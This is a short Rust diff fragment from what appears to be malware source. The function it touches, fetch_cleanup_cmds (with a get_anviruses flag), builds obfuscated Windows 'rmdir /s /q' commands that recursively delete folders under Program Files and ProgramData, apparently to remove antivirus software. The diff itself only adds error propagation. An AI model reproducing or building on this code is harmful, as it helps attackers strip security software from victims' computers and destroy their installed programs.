@@ -129,7 +129,7 @@ fn fetch_cleanup_cmds(get_anviruses: bool) -> Result<Vec<String>> {
             program_files_path,
             program_files_86_path,
             program_data_path
-        );
+        )?;
 
         for dir in dirs {
             cmds_to_execute.push(format!("{}{}{}", s!(r#"rmdir ""#), dir, s!(r#"" /s /q"#)));
